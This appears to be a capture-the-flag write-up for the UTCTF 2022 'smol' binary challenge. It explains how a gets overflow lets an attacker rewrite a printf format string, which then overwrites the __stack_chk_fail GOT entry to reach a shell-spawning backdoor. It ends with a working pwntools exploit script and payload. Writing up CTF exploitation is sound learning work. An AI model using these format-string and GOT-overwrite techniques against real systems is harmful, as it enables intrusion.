---
title:  "[UTCTF 2022] smol"
date: 2022-03-14 10:12:50
author: aynakeya
---

# 0x0 Introduction

In this challenge, a binary `smol` is provided. 

# 0x1 Mitigation

```
    # Arch:     amd64-64-little
    # RELRO:    Partial RELRO
    # Stack:    Canary found
    # NX:       NX enabled
    # PIE:      No PIE (0x400000)
```

<!-- more -->

# 0x2 Identify the problem

here is a simplified version of what is main function doing. 
```
main(void)
{
    var char *s1 @ rbp-0x150
    var char *format @ rbp-0xe0
    var char *s @ rbp-0x70
    var int64_t canary @ rbp-0x8

    canary = *(in_FS_OFFSET + 0x28);
    sym.imp.puts("What kind of data do you have?");
    sym.imp.gets(&s1);
    iVar2 = sym.imp.strcmp(&s1, "big data");
    if (iVar2 == 0) {
        // set variable format to some certain format
    }
    else {
        // set format to some certain format
    }
    sym.imp.puts("Give me your data");
    sym.imp.gets(&s);
    sym.imp.printf(&format, &s);
    sym.imp.putchar(10);
    if (canary != *(in_FS_OFFSET + 0x28)) {
        sym.imp.__stack_chk_fail();
    }
    return 0;
}
```

Take a brief looking at the code, we can identify two trivial vulnerability here. One is `gets`, which allow us to write arbitrary number of bytes to the stack. Another is `printf`, printf allow us to read/write data at specific address.

Since `format` is locate under variable `s1`, we can overwrite `format` with any format we want using `gets(&s1)`. This allow us to do a arbitrary read/write with `printf`. 

My first idea is try to leak the data in the canary and then do a rop chain to get a shell. However, `printf` execute after last `gets` function. Even we get the canary, we can't overwrite canary because there is no stack overflow bug after that.

Lets take look at mitigation again, the mitigation shows that this program is partial RELRO. This allows us to modify the function address in the global offset table. So it is a good idea using `printf` to overwrite `__stack_chk_fail`'s address to a code address in global offset table. Then, we overwrite canary to trigger `__stack_chk_fail` and call the code we want.

Luckily, the binary kindly give us a backdoor at `get_flag()`. So, write address of `__stack_chk_fail` at GOT to `get_flag()` will give us a shell.

```
void sym.get_flag(void){
// some code
    sym.imp.execve("/bin/sh", &var_20h, 0);
// some code
    return;
}
```

# 0x3 Exploits

```
io = connect("pwn.utctf.live", 5004)

print("got __stack_chk_fail,",hex(exe.got["__stack_chk_fail"]))
payload1 = flat({
    0x0:exe.got["__stack_chk_fail"],
    0x150 - 0xe0: b'%%%dx%%6$hn\x00' % 0x1349
},filler=b"A")
io.sendlineafter(b"do you have?\n",payload1)
# trigger stack chk fail
io.sendlineafter(b"Give me your data\n",b"A"*0x70)
io.interactive()
```